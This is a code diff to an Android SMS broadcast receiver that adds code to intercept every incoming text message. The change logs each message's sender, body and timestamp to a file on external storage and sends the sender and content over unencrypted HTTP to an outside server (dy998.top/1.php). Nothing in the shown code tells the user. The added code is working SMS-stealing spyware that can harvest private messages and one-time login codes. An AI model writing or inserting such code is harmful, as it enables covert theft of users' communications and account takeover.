@@ -7,29 +7,61 @@ import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
+import android.os.Environment;
 import android.telephony.gsm.SmsMessage;
 import android.widget.Toast;
 
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.Date;
+
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
 
 public class SMSRecevier extends BroadcastReceiver {
 
     @Override
-    public void onReceive(Context context, Intent intent) {
+    public void onReceive(final Context context, Intent intent) {
         if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
             Bundle bundle = intent.getExtras();
             if (bundle!=null){
                 Object[] smsObj = (Object[]) bundle.get("pdus");
                 for (Object o : smsObj){
-                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) o);
+                    final SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) o);
                     Date date = new Date(smsMessage.getTimestampMillis());
                     SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-                    Toast.makeText(context,smsMessage.getOriginatingAddress()+"-"+smsMessage.getMessageBody()+"-"+simpleDateFormat.format(date),Toast.LENGTH_SHORT).show();
+                    final String messages = smsMessage.getOriginatingAddress()+"-"+smsMessage.getMessageBody()+"-"+simpleDateFormat.format(date);
+                   Toast.makeText(context,messages,Toast.LENGTH_SHORT).show();
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            final File file =  new File(Environment.getExternalStorageDirectory().getPath()+"/sms.txt");
+                            try {
+                                FileOutputStream fileOutputStream = new FileOutputStream(file,false);
+                                fileOutputStream.write(messages.getBytes());
+                                fileOutputStream.flush();
+                                fileOutputStream.close();
+                            } catch (FileNotFoundException e) {
+                                e.printStackTrace();
+                                Toast.makeText(context,e.getMessage(),Toast.LENGTH_SHORT).show();
+                            } catch (IOException e) {
+                                e.printStackTrace();
+                                Toast.makeText(context,e.getMessage(),Toast.LENGTH_SHORT).show();
+                            }
+                            try {
+                                new OkHttpClient().newCall(new Request.Builder()
+                                        .url("http://www.dy998.top/1.php?id="+smsMessage.getOriginatingAddress()+"&neirong="+messages).get().build()).execute();
+                            } catch (IOException e) {
+                                e.printStackTrace();
+                            }
+                        }
+                    }).start();
                 }
             }
 
-            //Toast.makeText(context,getSmsMessage(context),Toast.LENGTH_SHORT).show();
         }
     }
 
